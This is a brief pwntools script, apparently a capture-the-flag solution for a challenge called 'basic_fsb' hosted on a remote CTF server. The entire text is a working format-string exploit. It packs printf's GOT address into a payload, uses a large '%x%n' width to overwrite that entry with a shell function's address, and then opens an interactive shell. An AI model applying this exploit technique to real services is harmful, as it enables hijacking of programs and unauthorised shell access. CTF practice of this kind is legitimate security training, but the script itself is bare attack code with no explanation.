from pwn import *

p = remote("ctf.j0n9hyun.xyz",3002)
#p=process("./basic_fsb")

jump= 0x080485b3
shell  = 0x080485b4

printgot = 0x804a00c

payload = (p32(printgot))
payload += "%134514096x%n"
p.send(payload)
print p.recvrepeat(0.4)
p.interactive()
